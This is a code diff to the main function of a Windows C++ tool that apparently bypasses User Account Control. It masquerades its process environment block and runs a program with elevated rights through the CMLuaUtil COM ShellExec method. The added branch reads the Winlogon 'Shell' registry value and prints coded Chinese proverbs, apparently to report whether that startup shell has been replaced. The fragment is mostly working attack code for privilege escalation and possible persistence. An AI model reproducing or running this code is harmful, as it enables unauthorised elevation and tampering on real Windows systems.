@@ -432,7 +432,36 @@ VOID wmain(int argc, TCHAR* argv[])
 		return;
 
 	MasqueradePEB();
-	TCHAR lpszFullParameter[260]{};
-	wsprintf(lpszFullParameter, L"%s %s", argv[2], argv[3]);
-	ucmCMLuaUtilShellExecMethod(argv[1], lpszFullParameter);
+
+	if (lstrcmp(argv[3], L"read") == 0)
+	{
+		DWORD nSize = 260;
+		TCHAR szShellPath[MAX_PATH]{};
+		DWORD dwType = REG_SZ;
+		auto result = RegGetValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Shell", RRF_RT_REG_SZ | RRF_RT_REG_EXPAND_SZ, &dwType, (PVOID)szShellPath, &nSize);
+
+		if (ERROR_SUCCESS == result)
+		{
+			std::wcout.imbue(std::locale("chs"));
+
+			if (lstrcmp(szShellPath,L"explorer.exe") == 0)
+			{
+				std::wcout << L"少年易老学难成" << std::endl;
+			}
+			else
+			{
+				std::wcout << L"一寸光阴不可轻" << std::endl;
+			}
+
+			return;
+		}
+		
+		std::wcout << L"一寸光阴不可轻" << std::endl;
+	}
+	else
+	{
+		TCHAR lpszFullParameter[260]{};
+		wsprintf(lpszFullParameter, L"%s %s", argv[2], argv[3]);
+		ucmCMLuaUtilShellExecMethod(argv[1], lpszFullParameter);
+	}
 }
